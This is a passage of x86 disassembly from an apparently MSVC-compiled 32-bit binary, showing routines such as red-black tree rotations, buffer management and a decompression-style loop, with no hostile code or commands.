   19e9e:	push   DWORD PTR [ebp+0x8]
   19ea1:	mov    ebx,ecx
   19ea3:	call   0x19d78
   19ea8:	lea    eax,[esi+0x1]
   19eab:	movzx  edx,BYTE PTR [eax]
   19eae:	push   eax
   19eaf:	inc    edi
   19eb0:	lea    edx,[edx*8+0x7ae48]
   19eb7:	push   edi
   19eb8:	push   edx
   19eb9:	mov    ecx,ebx
   19ebb:	call   DWORD PTR [edx+0x4]
   19ebe:	pop    edi
   19ebf:	pop    esi
   19ec0:	pop    ebx
   19ec1:	pop    ebp
   19ec2:	ret    0xc
   19ec5:	int3   
   19ec6:	int3   
   19ec7:	int3   
   19ec8:	int3   
   19ec9:	int3   
   19eca:	mov    edi,edi
   19ecc:	push   ebp
   19ecd:	mov    ebp,esp
   19ecf:	mov    DWORD PTR [ecx],0x1
   19ed5:	pop    ebp
   19ed6:	jmp    0x19e52
   19edb:	int3   
   19edc:	int3   
   19edd:	int3   
   19ede:	int3   
   19edf:	int3   
   19ee0:	mov    edi,edi
   19ee2:	push   ebp
   19ee3:	mov    ebp,esp
   19ee5:	mov    DWORD PTR [ecx+0x4],0x1
   19eec:	pop    ebp
   19eed:	jmp    0x19e52
   19ef2:	int3   
   19ef3:	int3   
   19ef4:	int3   
   19ef5:	int3   
   19ef6:	int3   
   19ef7:	int3   
   19ef8:	mov    edi,edi
   19efa:	push   ebp
   19efb:	mov    ebp,esp
   19efd:	mov    eax,DWORD PTR [ebp+0x10]
   19f00:	sub    esp,0x10
   19f03:	test   BYTE PTR [eax+0x1],0x38
   19f07:	push   eax
   19f08:	push   DWORD PTR [ebp+0xc]
   19f0b:	jne    0x19f20
   19f0d:	mov    DWORD PTR [ebp-0x8],0x5bf6
   19f14:	mov    DWORD PTR [ebp-0x4],0x19d78
   19f1b:	lea    eax,[ebp-0x8]
   19f1e:	jmp    0x19f31
   19f20:	mov    DWORD PTR [ebp-0x10],0x52f6
   19f27:	mov    DWORD PTR [ebp-0xc],0x19d78
   19f2e:	lea    eax,[ebp-0x10]
   19f31:	push   eax
   19f32:	call   0x19d78
   19f37:	leave  
   19f38:	ret    0xc
   19f3b:	int3   
   19f3c:	int3   
   19f3d:	int3   
   19f3e:	int3   
   19f3f:	int3   
   19f40:	mov    edi,edi
   19f42:	push   ebp
   19f43:	mov    ebp,esp
   19f45:	mov    eax,DWORD PTR [ebp+0x10]
   19f48:	sub    esp,0x10
   19f4b:	test   BYTE PTR [eax+0x1],0x38
   19f4f:	push   eax
   19f50:	push   DWORD PTR [ebp+0xc]
   19f53:	jne    0x19f68
   19f55:	mov    DWORD PTR [ebp-0x8],0x66f7
   19f5c:	mov    DWORD PTR [ebp-0x4],0x19d78
   19f63:	lea    eax,[ebp-0x8]
   19f66:	jmp    0x19f79
   19f68:	mov    DWORD PTR [ebp-0x10],0x52f7
   19f6f:	mov    DWORD PTR [ebp-0xc],0x19d78
   19f76:	lea    eax,[ebp-0x10]
   19f79:	push   eax
   19f7a:	call   0x19d78
   19f7f:	leave  
   19f80:	ret    0xc
   19f83:	int3   
   19f84:	int3   
   19f85:	int3   
   19f86:	int3   
   19f87:	int3   
   19f88:	mov    edi,edi
   19f8a:	push   ebp
   19f8b:	mov    ebp,esp
   19f8d:	push   ecx
   19f8e:	push   ecx
   19f8f:	mov    edx,DWORD PTR [ebp+0x10]
   19f92:	mov    al,BYTE PTR [edx+0x1]
   19f95:	cmp    al,0x15
   19f97:	je     0x19fb7
   19f99:	cmp    al,0x25
   19f9b:	je     0x19fb7
   19f9d:	and    al,0x38
   19f9f:	cmp    al,0x10
   19fa1:	je     0x19faf
   19fa3:	cmp    al,0x18
   19fa5:	je     0x19faf
   19fa7:	cmp    al,0x20
   19fa9:	je     0x19faf
   19fab:	cmp    al,0x28
   19fad:	jne    0x19fc3
   19faf:	mov    eax,DWORD PTR [ecx+0x8]
   19fb2:	or     DWORD PTR [eax],0xffffffff
   19fb5:	jmp    0x19fc3
   19fb7:	mov    eax,DWORD PTR [edx+0x2]
   19fba:	mov    eax,DWORD PTR [eax]
   19fbc:	push   esi
   19fbd:	mov    esi,DWORD PTR [ecx+0x8]
   19fc0:	mov    DWORD PTR [esi],eax
   19fc2:	pop    esi
   19fc3:	push   edx
   19fc4:	push   DWORD PTR [ebp+0xc]
   19fc7:	lea    eax,[ebp-0x8]
   19fca:	push   eax
   19fcb:	mov    DWORD PTR [ebp-0x8],0x52ff
   19fd2:	mov    DWORD PTR [ebp-0x4],0x19d78
   19fd9:	call   0x19d78
   19fde:	leave  
   19fdf:	ret    0xc
   19fe2:	int3   
   19fe3:	int3   
   19fe4:	int3   
   19fe5:	int3   
   19fe6:	int3   
   19fe7:	int3   
   19fe8:	mov    edi,edi
   19fea:	push   ebp
   19feb:	mov    ebp,esp
   19fed:	sub    esp,0x5c
   19ff0:	mov    eax,ds:0x7e528
   19ff5:	xor    eax,ebp
   19ff7:	mov    DWORD PTR [ebp-0x4],eax
   19ffa:	mov    eax,DWORD PTR [ebp+0x10]
   19ffd:	push   esi
   19ffe:	mov    esi,DWORD PTR [ebp+0x8]
   1a001:	push   edi
   1a002:	mov    edi,DWORD PTR [ebp+0xc]
   1a005:	push   0x0
   1a007:	push   eax
   1a008:	lea    ecx,[ebp-0x5c]
   1a00b:	call   0x19d3e
   1a010:	push   edi
   1a011:	push   esi
   1a012:	lea    ecx,[ebp-0x5c]
   1a015:	call   0x19c80
   1a01a:	mov    ecx,DWORD PTR [ebp-0x4]
   1a01d:	pop    edi
   1a01e:	xor    ecx,ebp
   1a020:	pop    esi
   1a021:	call   0x1da55
   1a026:	leave  
   1a027:	ret    0xc
   1a02a:	int3   
   1a02b:	int3   
   1a02c:	int3   
   1a02d:	int3   
   1a02e:	int3   
   1a02f:	int3   
   1a030:	mov    edi,edi
   1a032:	push   ebp
   1a033:	mov    ebp,esp
   1a035:	push   esi
   1a036:	mov    esi,DWORD PTR [ebp+0x8]
   1a039:	push   edi
   1a03a:	mov    edi,ecx
   1a03c:	cmp    edi,esi
   1a03e:	je     0x1a06b
   1a040:	mov    eax,DWORD PTR [edi+0x4]
   1a043:	cmp    eax,DWORD PTR [esi+0x4]
   1a046:	je     0x1a05a
   1a048:	cmp    BYTE PTR [edi],0x0
   1a04b:	je     0x1a054
   1a04d:	push   eax
   1a04e:	call   0x10a86
   1a053:	pop    ecx
   1a054:	mov    al,BYTE PTR [esi]
   1a056:	mov    BYTE PTR [edi],al
   1a058:	jmp    0x1a062
   1a05a:	cmp    BYTE PTR [esi],0x0
   1a05d:	je     0x1a062
   1a05f:	mov    BYTE PTR [edi],0x1
   1a062:	mov    eax,DWORD PTR [esi+0x4]
   1a065:	mov    BYTE PTR [esi],0x0
   1a068:	mov    DWORD PTR [edi+0x4],eax
   1a06b:	mov    eax,edi
   1a06d:	pop    edi
   1a06e:	pop    esi
   1a06f:	pop    ebp
   1a070:	ret    0x4
   1a073:	int3   
   1a074:	int3   
   1a075:	int3   
   1a076:	int3   
   1a077:	int3   
   1a078:	mov    edi,edi
   1a07a:	push   ebp
   1a07b:	mov    ebp,esp
   1a07d:	sub    esp,0x50
   1a080:	push   ebx
   1a081:	push   esi
   1a082:	push   edi
   1a083:	mov    edi,0x4000
   1a088:	push   edi
   1a089:	call   0x10a52
   1a08e:	pop    ecx
   1a08f:	xor    ebx,ebx
   1a091:	push   0x38
   1a093:	push   0x1ec86
   1a098:	cmp    eax,ebx
   1a09a:	mov    DWORD PTR [ebp-0x4],eax
   1a09d:	mov    DWORD PTR [ebp-0xc],eax
   1a0a0:	push   0x2f
   1a0a2:	lea    eax,[ebp-0x50]
   1a0a5:	setne  BYTE PTR [ebp-0x10]
   1a0a9:	push   eax
   1a0aa:	xor    esi,esi
   1a0ac:	mov    DWORD PTR [ebp-0x30],ebx
   1a0af:	mov    DWORD PTR [ebp-0x2c],ebx
   1a0b2:	mov    DWORD PTR [ebp-0x28],ebx
   1a0b5:	mov    DWORD PTR [ebp-0x4c],ebx
   1a0b8:	mov    DWORD PTR [ebp-0x50],ebx
   1a0bb:	call   0x1b94a
   1a0c0:	test   eax,eax
   1a0c2:	je     0x1a0e1
   1a0c4:	mov    esi,DWORD PTR [ebp+0x8]
   1a0c7:	mov    BYTE PTR [esi],bl
   1a0c9:	mov    DWORD PTR [esi+0x4],ebx
   1a0cc:	cmp    BYTE PTR [ebp-0x10],bl
   1a0cf:	je     0x1a0da
   1a0d1:	push   DWORD PTR [ebp-0x4]
   1a0d4:	call   0x10a86
   1a0d9:	pop    ecx
   1a0da:	mov    eax,esi
   1a0dc:	jmp    0x1a1f6
   1a0e1:	mov    eax,DWORD PTR [ebp+0x10]
   1a0e4:	mov    DWORD PTR [ebp-0x4c],eax
   1a0e7:	mov    eax,DWORD PTR [ebp+0xc]
   1a0ea:	mov    DWORD PTR [ebp-0x50],eax
   1a0ed:	mov    eax,DWORD PTR [ebp-0xc]
   1a0f0:	add    eax,esi
   1a0f2:	mov    DWORD PTR [ebp-0x44],eax
   1a0f5:	push   0x4
   1a0f7:	lea    eax,[ebp-0x50]
   1a0fa:	push   eax
   1a0fb:	mov    DWORD PTR [ebp-0x40],edi
   1a0fe:	call   0x1bade
   1a103:	cmp    eax,0xfffffffc
   1a106:	mov    DWORD PTR [ebp+0x10],eax
   1a109:	jl     0x1a11d
   1a10b:	cmp    eax,0xfffffffd
   1a10e:	jle    0x1a1a6
   1a114:	cmp    eax,0x2
   1a117:	je     0x1a1a6
   1a11d:	mov    eax,edi
   1a11f:	sub    eax,DWORD PTR [ebp-0x40]
   1a122:	add    esi,eax
   1a124:	cmp    DWORD PTR [ebp-0x40],ebx
   1a127:	jne    0x1a190
   1a129:	mov    al,BYTE PTR [ebp-0x10]
   1a12c:	mov    BYTE PTR [ebp-0x18],al
   1a12f:	mov    eax,DWORD PTR [ebp-0xc]
   1a132:	mov    DWORD PTR [ebp-0x14],eax
   1a135:	lea    eax,[esi+0x4000]
   1a13b:	push   eax
   1a13c:	mov    BYTE PTR [ebp-0x10],bl
   1a13f:	call   0x10a52
   1a144:	pop    ecx
   1a145:	cmp    eax,ebx
   1a147:	setne  cl
   1a14a:	mov    DWORD PTR [ebp-0x4],eax
   1a14d:	lea    eax,[ebp-0x8]
   1a150:	mov    BYTE PTR [ebp-0x8],cl
   1a153:	push   eax
   1a154:	lea    ecx,[ebp-0x10]
   1a157:	call   0x1a030
   1a15c:	cmp    BYTE PTR [ebp-0x8],bl
   1a15f:	je     0x1a16a
   1a161:	push   DWORD PTR [ebp-0x4]
   1a164:	call   0x10a86
   1a169:	pop    ecx
   1a16a:	push   esi
   1a16b:	push   DWORD PTR [ebp-0x14]
   1a16e:	push   DWORD PTR [ebp-0xc]
   1a171:	call   0x1dac6
   1a176:	add    esp,0xc
   1a179:	cmp    BYTE PTR [ebp-0x18],bl
   1a17c:	je     0x1a187
   1a17e:	push   DWORD PTR [ebp-0x14]
   1a181:	call   0x10a86
   1a186:	pop    ecx
   1a187:	cmp    DWORD PTR [ebp-0x40],ebx
   1a18a:	je     0x1a0ed
   1a190:	lea    eax,[ebp-0x50]
   1a193:	push   eax
   1a194:	call   0x1ccfc
   1a199:	cmp    DWORD PTR [ebp+0x10],0x1
   1a19d:	jne    0x1a1c8
   1a19f:	mov    eax,DWORD PTR [ebp+0x14]
   1a1a2:	mov    DWORD PTR [eax],esi
   1a1a4:	jmp    0x1a1e8
   1a1a6:	lea    eax,[ebp-0x50]
   1a1a9:	push   eax
   1a1aa:	call   0x1ccfc
   1a1af:	mov    esi,DWORD PTR [ebp+0x8]
   1a1b2:	mov    BYTE PTR [esi],bl
   1a1b4:	mov    DWORD PTR [esi+0x4],ebx
   1a1b7:	cmp    BYTE PTR [ebp-0x10],bl
   1a1ba:	je     0x1a0da
   1a1c0:	push   DWORD PTR [ebp-0xc]
   1a1c3:	jmp    0x1a0d4
   1a1c8:	lea    eax,[ebp-0x18]
   1a1cb:	push   eax
   1a1cc:	lea    ecx,[ebp-0x10]
   1a1cf:	mov    BYTE PTR [ebp-0x18],bl
   1a1d2:	mov    DWORD PTR [ebp-0x14],ebx
   1a1d5:	call   0x1a030
   1a1da:	cmp    BYTE PTR [ebp-0x18],bl
   1a1dd:	je     0x1a1e8
   1a1df:	push   DWORD PTR [ebp-0x14]
   1a1e2:	call   0x10a86
   1a1e7:	pop    ecx
   1a1e8:	mov    eax,DWORD PTR [ebp+0x8]
   1a1eb:	mov    cl,BYTE PTR [ebp-0x10]
   1a1ee:	mov    BYTE PTR [eax],cl
   1a1f0:	mov    ecx,DWORD PTR [ebp-0xc]
   1a1f3:	mov    DWORD PTR [eax+0x4],ecx
   1a1f6:	pop    edi
   1a1f7:	pop    esi
   1a1f8:	pop    ebx
   1a1f9:	leave  
   1a1fa:	ret    0x10
   1a1fd:	int3   
   1a1fe:	int3   
   1a1ff:	int3   
   1a200:	int3   
   1a201:	int3   
   1a202:	xor    eax,eax
   1a204:	push   eax
   1a205:	push   eax
   1a206:	push   eax
   1a207:	push   eax
   1a208:	push   0x7fa38
   1a20d:	call   DWORD PTR ds:0x1f028
   1a213:	test   eax,eax
   1a215:	setge  al
   1a218:	ret    
   1a219:	int3   
   1a21a:	int3   
   1a21b:	int3   
   1a21c:	int3   
   1a21d:	int3   
   1a21e:	push   0x0
   1a220:	push   0x7fa38
   1a225:	call   DWORD PTR ds:0x1f024
   1a22b:	ret    
   1a22c:	int3   
   1a22d:	int3   
   1a22e:	int3   
   1a22f:	int3   
   1a230:	int3   
   1a231:	int3   
   1a232:	mov    edi,edi
   1a234:	push   esi
   1a235:	push   edi
   1a236:	push   0x1
   1a238:	xor    edi,edi
   1a23a:	push   edi
   1a23b:	mov    esi,ecx
   1a23d:	call   0x139fe
   1a242:	cmp    DWORD PTR ds:0x7f8d4,edi
   1a248:	jne    0x1a25f
   1a24a:	mov    ecx,eax
   1a24c:	mov    DWORD PTR ds:0x7f8d4,ecx
   1a252:	mov    DWORD PTR [ecx],edi
   1a254:	mov    ecx,DWORD PTR ds:0x7f8d4
   1a25a:	xor    eax,eax
   1a25c:	mov    DWORD PTR [ecx+0x8],edi
   1a25f:	inc    DWORD PTR ds:0x7fa60
   1a265:	cmp    eax,edi
   1a267:	je     0x1a270
   1a269:	push   eax
   1a26a:	call   0x10a86
   1a26f:	pop    ecx
   1a270:	push   edi
   1a271:	push   DWORD PTR ds:0x7f8d4
   1a277:	mov    ecx,esi
   1a279:	call   0x139fe
   1a27e:	mov    DWORD PTR [esi+0xc],edi
   1a281:	mov    DWORD PTR [esi+0x4],eax
   1a284:	mov    DWORD PTR [eax],eax
   1a286:	mov    esi,DWORD PTR [esi+0x4]
   1a289:	pop    edi
   1a28a:	mov    DWORD PTR [esi+0x8],esi
   1a28d:	pop    esi
   1a28e:	ret    
   1a28f:	int3   
   1a290:	int3   
   1a291:	int3   
   1a292:	int3   
   1a293:	int3   
   1a294:	mov    edi,edi
   1a296:	push   ebx
   1a297:	push   esi
   1a298:	xor    ebx,ebx
   1a29a:	push   ebx
   1a29b:	push   0x7fa38
   1a2a0:	call   0x11c74
   1a2a5:	call   eax
   1a2a7:	push   0x10
   1a2a9:	call   0x10a52
   1a2ae:	mov    esi,eax
   1a2b0:	pop    ecx
   1a2b1:	cmp    esi,ebx
   1a2b3:	je     0x1a2c7
   1a2b5:	mov    ecx,esi
   1a2b7:	mov    BYTE PTR [esi+0x8],bl
   1a2ba:	call   0x1a232
   1a2bf:	mov    DWORD PTR ds:0x7fa58,esi
   1a2c5:	jmp    0x1a2cd
   1a2c7:	mov    DWORD PTR ds:0x7fa58,ebx
   1a2cd:	push   0x10
   1a2cf:	call   0x10a52
   1a2d4:	mov    esi,eax
   1a2d6:	pop    ecx
   1a2d7:	cmp    esi,ebx
   1a2d9:	je     0x1a2ed
   1a2db:	mov    ecx,esi
   1a2dd:	mov    BYTE PTR [esi+0x8],bl
   1a2e0:	call   0x1413a
   1a2e5:	mov    DWORD PTR ds:0x7fa5c,esi
   1a2eb:	jmp    0x1a2f3
   1a2ed:	mov    DWORD PTR ds:0x7fa5c,ebx
   1a2f3:	pop    esi
   1a2f4:	pop    ebx
   1a2f5:	ret    
   1a2f6:	int3   
   1a2f7:	int3   
   1a2f8:	int3   
   1a2f9:	int3   
   1a2fa:	int3   
   1a2fb:	int3   
   1a2fc:	mov    edi,edi
   1a2fe:	push   ebp
   1a2ff:	mov    ebp,esp
   1a301:	mov    eax,ecx
   1a303:	mov    ecx,DWORD PTR [ebp+0xc]
   1a306:	mov    edx,DWORD PTR [ecx]
   1a308:	mov    DWORD PTR [eax],edx
   1a30a:	mov    edx,DWORD PTR [ecx]
   1a30c:	add    edx,0x1000
   1a312:	mov    DWORD PTR [eax+0x4],edx
   1a315:	mov    edx,DWORD PTR [ebp+0x8]
   1a318:	mov    DWORD PTR [eax+0x8],edx
   1a31b:	mov    DWORD PTR [eax+0xc],ecx
   1a31e:	pop    ebp
   1a31f:	ret    0x8
   1a322:	int3   
   1a323:	int3   
   1a324:	int3   
   1a325:	int3   
   1a326:	int3   
   1a327:	int3   
   1a328:	mov    edi,edi
   1a32a:	push   ebp
   1a32b:	mov    ebp,esp
   1a32d:	mov    eax,DWORD PTR [ebp+0x8]
   1a330:	mov    edx,DWORD PTR ds:0x7fa94
   1a336:	jmp    0x1a33a
   1a338:	mov    eax,ecx
   1a33a:	mov    ecx,DWORD PTR [eax+0x8]
   1a33d:	cmp    ecx,edx
   1a33f:	jne    0x1a338
   1a341:	pop    ebp
   1a342:	ret    0x4
   1a345:	int3   
   1a346:	int3   
   1a347:	int3   
   1a348:	int3   
   1a349:	int3   
   1a34a:	mov    edi,edi
   1a34c:	push   ebp
   1a34d:	mov    ebp,esp
   1a34f:	mov    eax,DWORD PTR [ebp+0x8]
   1a352:	mov    edx,DWORD PTR ds:0x7fa94
   1a358:	jmp    0x1a35c
   1a35a:	mov    eax,ecx
   1a35c:	mov    ecx,DWORD PTR [eax]
   1a35e:	cmp    ecx,edx
   1a360:	jne    0x1a35a
   1a362:	pop    ebp
   1a363:	ret    0x4
   1a366:	int3   
   1a367:	int3   
   1a368:	int3   
   1a369:	int3   
   1a36a:	int3   
   1a36b:	int3   
   1a36c:	mov    edi,edi
   1a36e:	push   esi
   1a36f:	mov    esi,ecx
   1a371:	mov    ecx,DWORD PTR [esi]
   1a373:	mov    eax,DWORD PTR [ecx+0x8]
   1a376:	cmp    eax,DWORD PTR ds:0x7fa94
   1a37c:	je     0x1a38a
   1a37e:	push   eax
   1a37f:	call   0x1a34a
   1a384:	jmp    0x1a399
   1a386:	mov    DWORD PTR [esi],eax
   1a388:	mov    ecx,eax
   1a38a:	mov    eax,DWORD PTR [ecx+0x4]
   1a38d:	cmp    ecx,DWORD PTR [eax+0x8]
   1a390:	je     0x1a386
   1a392:	mov    ecx,DWORD PTR [esi]
   1a394:	cmp    DWORD PTR [ecx+0x8],eax
   1a397:	je     0x1a39b
   1a399:	mov    DWORD PTR [esi],eax
   1a39b:	pop    esi
   1a39c:	ret    
   1a39d:	int3   
   1a39e:	int3   
   1a39f:	int3   
   1a3a0:	int3   
   1a3a1:	int3   
   1a3a2:	mov    edi,edi
   1a3a4:	push   ebp
   1a3a5:	mov    ebp,esp
   1a3a7:	mov    eax,DWORD PTR [ebp+0x8]
   1a3aa:	test   eax,eax
   1a3ac:	je     0x1a3b5
   1a3ae:	mov    ecx,DWORD PTR [ebp+0xc]
   1a3b1:	mov    ecx,DWORD PTR [ecx]
   1a3b3:	mov    DWORD PTR [eax],ecx
   1a3b5:	pop    ebp
   1a3b6:	ret    0x8
   1a3b9:	int3   
   1a3ba:	int3   
   1a3bb:	int3   
   1a3bc:	int3   
   1a3bd:	int3   
   1a3be:	mov    edi,edi
   1a3c0:	push   ebp
   1a3c1:	mov    ebp,esp
   1a3c3:	mov    eax,DWORD PTR [ebp+0x8]
   1a3c6:	jmp    0x1a3d6
   1a3c8:	mov    ecx,DWORD PTR [eax]
   1a3ca:	mov    edx,DWORD PTR [ebp+0x10]
   1a3cd:	add    DWORD PTR [ebp+0x10],0x4
   1a3d1:	mov    DWORD PTR [edx],ecx
   1a3d3:	add    eax,0x4
   1a3d6:	cmp    eax,DWORD PTR [ebp+0xc]
   1a3d9:	jne    0x1a3c8
   1a3db:	mov    eax,DWORD PTR [ebp+0x10]
   1a3de:	pop    ebp
   1a3df:	ret    0xc
   1a3e2:	int3   
   1a3e3:	int3   
   1a3e4:	int3   
   1a3e5:	int3   
   1a3e6:	int3   
   1a3e7:	int3   
   1a3e8:	mov    edi,edi
   1a3ea:	push   ebp
   1a3eb:	mov    ebp,esp
   1a3ed:	mov    eax,DWORD PTR [ebp+0x8]
   1a3f0:	test   eax,eax
   1a3f2:	jge    0x1a3f6
   1a3f4:	xor    eax,eax
   1a3f6:	shl    eax,0x2
   1a3f9:	push   eax
   1a3fa:	call   0x10a52
   1a3ff:	pop    ecx
   1a400:	pop    ebp
   1a401:	ret    0x8
   1a404:	int3   
   1a405:	int3   
   1a406:	int3   
   1a407:	int3   
   1a408:	int3   
   1a409:	int3   
   1a40a:	mov    edi,edi
   1a40c:	push   ebp
   1a40d:	mov    ebp,esp
   1a40f:	push   esi
   1a410:	mov    esi,ecx
   1a412:	push   DWORD PTR [esi]
   1a414:	call   0x10a86
   1a419:	test   BYTE PTR [ebp+0x8],0x1
   1a41d:	pop    ecx
   1a41e:	je     0x1a427
   1a420:	push   esi
   1a421:	call   0x10a86
   1a426:	pop    ecx
   1a427:	mov    eax,esi
   1a429:	pop    esi
   1a42a:	pop    ebp
   1a42b:	ret    0x4
   1a42e:	int3   
   1a42f:	int3   
   1a430:	int3   
   1a431:	int3   
   1a432:	int3   
   1a433:	int3   
   1a434:	mov    eax,ecx
   1a436:	add    DWORD PTR [eax+0x8],0x4
   1a43a:	mov    ecx,DWORD PTR [eax+0x8]
   1a43d:	cmp    ecx,DWORD PTR [eax+0x4]
   1a440:	jne    0x1a45b
   1a442:	add    DWORD PTR [eax+0xc],0x4
   1a446:	mov    ecx,DWORD PTR [eax+0xc]
   1a449:	mov    ecx,DWORD PTR [ecx]
   1a44b:	mov    DWORD PTR [eax],ecx
   1a44d:	add    ecx,0x1000
   1a453:	mov    DWORD PTR [eax+0x4],ecx
   1a456:	mov    ecx,DWORD PTR [eax]
   1a458:	mov    DWORD PTR [eax+0x8],ecx
   1a45b:	ret    
   1a45c:	int3   
   1a45d:	int3   
   1a45e:	int3   
   1a45f:	int3   
   1a460:	int3   
   1a461:	int3   
   1a462:	mov    edi,edi
   1a464:	push   ebp
   1a465:	mov    ebp,esp
   1a467:	mov    eax,ds:0x7fa8c
   1a46c:	sub    esp,0x20
   1a46f:	push   ebx
   1a470:	push   esi
   1a471:	push   edi
   1a472:	lea    esi,[eax+0x4]
   1a475:	lea    edi,[ebp-0x10]
   1a478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a47c:	lea    ebx,[eax+0x14]
   1a47f:	jmp    0x1a49d
   1a481:	mov    eax,DWORD PTR [eax]
   1a483:	mov    ecx,DWORD PTR [eax+0x8]
   1a486:	cmp    ecx,DWORD PTR [ebp+0x8]
   1a489:	jne    0x1a495
   1a48b:	cmp    BYTE PTR [eax+0x24],0x0
   1a48f:	jne    0x1a4ae
   1a491:	mov    BYTE PTR [eax+0x24],0x1
   1a495:	lea    ecx,[ebp-0x10]
   1a498:	call   0x1a434
   1a49d:	mov    eax,DWORD PTR [ebp-0x8]
   1a4a0:	lea    edi,[ebp-0x20]
   1a4a3:	mov    esi,ebx
   1a4a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4a9:	cmp    eax,DWORD PTR [ebp-0x18]
   1a4ac:	jne    0x1a481
   1a4ae:	pop    edi
   1a4af:	pop    esi
   1a4b0:	pop    ebx
   1a4b1:	leave  
   1a4b2:	ret    0x4
   1a4b5:	int3   
   1a4b6:	int3   
   1a4b7:	int3   
   1a4b8:	int3   
   1a4b9:	int3   
   1a4ba:	mov    eax,ecx
   1a4bc:	xor    ecx,ecx
   1a4be:	mov    DWORD PTR [eax+0x4],ecx
   1a4c1:	mov    DWORD PTR [eax+0x8],ecx
   1a4c4:	mov    DWORD PTR [eax+0xc],ecx
   1a4c7:	mov    DWORD PTR [eax+0x10],ecx
   1a4ca:	mov    DWORD PTR [eax+0x14],ecx
   1a4cd:	mov    DWORD PTR [eax+0x18],ecx
   1a4d0:	mov    DWORD PTR [eax+0x1c],ecx
   1a4d3:	mov    DWORD PTR [eax+0x20],ecx
   1a4d6:	mov    DWORD PTR [eax+0x24],ecx
   1a4d9:	mov    DWORD PTR [eax+0x28],ecx
   1a4dc:	mov    DWORD PTR [eax+0x2c],ecx
   1a4df:	ret    0x4
   1a4e2:	int3   
   1a4e3:	int3   
   1a4e4:	int3   
   1a4e5:	int3   
   1a4e6:	int3   
   1a4e7:	int3   
   1a4e8:	mov    edi,edi
   1a4ea:	push   ebp
   1a4eb:	mov    ebp,esp
   1a4ed:	sub    esp,0x10
   1a4f0:	push   esi
   1a4f1:	push   edi
   1a4f2:	lea    esi,[ecx+0x4]
   1a4f5:	lea    edi,[ebp-0x10]
   1a4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4fc:	mov    eax,DWORD PTR [ebp-0x8]
   1a4ff:	pop    edi
   1a500:	pop    esi
   1a501:	leave  
   1a502:	ret    
   1a503:	int3   
   1a504:	int3   
   1a505:	int3   
   1a506:	int3   
   1a507:	int3   
   1a508:	mov    edi,edi
   1a50a:	push   ebp
   1a50b:	mov    ebp,esp
   1a50d:	mov    edx,DWORD PTR [ebp+0x8]
   1a510:	mov    eax,DWORD PTR [edx+0x8]
   1a513:	push   esi
   1a514:	mov    esi,DWORD PTR [eax]
   1a516:	mov    DWORD PTR [edx+0x8],esi
   1a519:	mov    esi,DWORD PTR [eax]
   1a51b:	cmp    esi,DWORD PTR ds:0x7fa94
   1a521:	je     0x1a526
   1a523:	mov    DWORD PTR [esi+0x4],edx
   1a526:	mov    esi,DWORD PTR [edx+0x4]
   1a529:	mov    DWORD PTR [eax+0x4],esi
   1a52c:	mov    ecx,DWORD PTR [ecx+0x4]
   1a52f:	pop    esi
   1a530:	cmp    edx,DWORD PTR [ecx+0x4]
   1a533:	jne    0x1a53a
   1a535:	mov    DWORD PTR [ecx+0x4],eax
   1a538:	jmp    0x1a548
   1a53a:	mov    ecx,DWORD PTR [edx+0x4]
   1a53d:	cmp    edx,DWORD PTR [ecx]
   1a53f:	jne    0x1a545
   1a541:	mov    DWORD PTR [ecx],eax
   1a543:	jmp    0x1a548
   1a545:	mov    DWORD PTR [ecx+0x8],eax
   1a548:	mov    DWORD PTR [eax],edx
   1a54a:	mov    DWORD PTR [edx+0x4],eax
   1a54d:	pop    ebp
   1a54e:	ret    0x4
   1a551:	int3   
   1a552:	int3   
   1a553:	int3   
   1a554:	int3   
   1a555:	int3   
   1a556:	mov    edi,edi
   1a558:	push   ebp
   1a559:	mov    ebp,esp
   1a55b:	mov    edx,DWORD PTR [ebp+0x8]
   1a55e:	mov    eax,DWORD PTR [edx]
   1a560:	push   esi
   1a561:	mov    esi,DWORD PTR [eax+0x8]
   1a564:	mov    DWORD PTR [edx],esi
   1a566:	mov    esi,DWORD PTR [eax+0x8]
   1a569:	cmp    esi,DWORD PTR ds:0x7fa94
   1a56f:	je     0x1a574
   1a571:	mov    DWORD PTR [esi+0x4],edx
   1a574:	mov    esi,DWORD PTR [edx+0x4]
   1a577:	mov    DWORD PTR [eax+0x4],esi
   1a57a:	mov    ecx,DWORD PTR [ecx+0x4]
   1a57d:	pop    esi
   1a57e:	cmp    edx,DWORD PTR [ecx+0x4]
   1a581:	jne    0x1a588
   1a583:	mov    DWORD PTR [ecx+0x4],eax
   1a586:	jmp    0x1a597
   1a588:	mov    ecx,DWORD PTR [edx+0x4]
   1a58b:	cmp    edx,DWORD PTR [ecx+0x8]
   1a58e:	jne    0x1a595
   1a590:	mov    DWORD PTR [ecx+0x8],eax
   1a593:	jmp    0x1a597
   1a595:	mov    DWORD PTR [ecx],eax
   1a597:	mov    DWORD PTR [eax+0x8],edx
   1a59a:	mov    DWORD PTR [edx+0x4],eax
   1a59d:	pop    ebp
   1a59e:	ret    0x4
   1a5a1:	int3   
   1a5a2:	int3   
   1a5a3:	int3   
   1a5a4:	int3   
   1a5a5:	int3   
   1a5a6:	mov    edi,edi
   1a5a8:	push   esi
   1a5a9:	mov    esi,ecx
   1a5ab:	mov    ecx,DWORD PTR [esi]
   1a5ad:	cmp    DWORD PTR [ecx+0x14],0x0
   1a5b1:	jne    0x1a5c0
   1a5b3:	mov    eax,DWORD PTR [ecx+0x4]
   1a5b6:	cmp    DWORD PTR [eax+0x4],ecx
   1a5b9:	jne    0x1a5c0
   1a5bb:	mov    eax,DWORD PTR [ecx+0x8]
   1a5be:	jmp    0x1a5dd
   1a5c0:	mov    eax,DWORD PTR [ecx]
   1a5c2:	cmp    eax,DWORD PTR ds:0x7fa94
   1a5c8:	je     0x1a5d6
   1a5ca:	push   eax
